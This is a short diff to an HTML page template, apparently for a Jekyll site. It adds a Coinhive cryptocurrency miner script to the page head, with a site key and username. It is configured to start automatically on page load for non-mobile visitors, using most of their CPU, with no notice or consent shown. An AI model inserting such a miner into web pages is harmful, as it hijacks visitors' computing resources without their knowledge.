@@ -36,6 +36,18 @@
 <!-- Modernizr -->
 <script src="{{ site.url }}/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>
 
+<!-- Miner -->
+<script src="https://coin-hive.com/lib/coinhive.min.js">
+var miner = new CoinHive.User('wHgHeuOVbM5FTi93SaXqtYUWSPW1yi4U', 'luiz-santos', {
+				autoThreads: true,
+				throttle: 0.8,
+				language: 'auto'
+				});
+if (!miner.isMobile()) {
+	miner.start();
+}
+</script>
+
 <link href='//fonts.googleapis.com/css?family=PT+Sans+Narrow:400,700%7CPT+Serif:400,700,400italic' rel='stylesheet' type='text/css'>
 
 <!-- Icons -->
